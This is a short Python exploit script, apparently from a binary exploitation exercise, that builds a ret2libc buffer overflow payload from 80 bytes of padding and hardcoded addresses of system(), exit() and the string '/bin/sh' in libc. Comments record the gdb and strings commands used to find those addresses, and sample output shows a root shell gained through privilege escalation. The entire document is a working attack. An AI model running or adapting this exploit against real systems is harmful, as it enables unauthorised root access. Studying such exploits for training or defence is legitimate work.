#!/usr/bin/env python 

# $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>


# strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"


# $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

# (gdb) x/s 0xb7e97000+ 0x11f3bf 


import struct




Offset = "A"*80

JMP_system_address = struct.pack('I',0xb7ecffb0)

ret_Exit_address   = struct.pack('I',0xb7ec60c0)

address_bin_sh    = struct.pack('I',0xb7fb63bf)


execute = Offset + JMP_system_address + ret_Exit_address + address_bin_sh

print execute
 
#uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

#whoami

#root




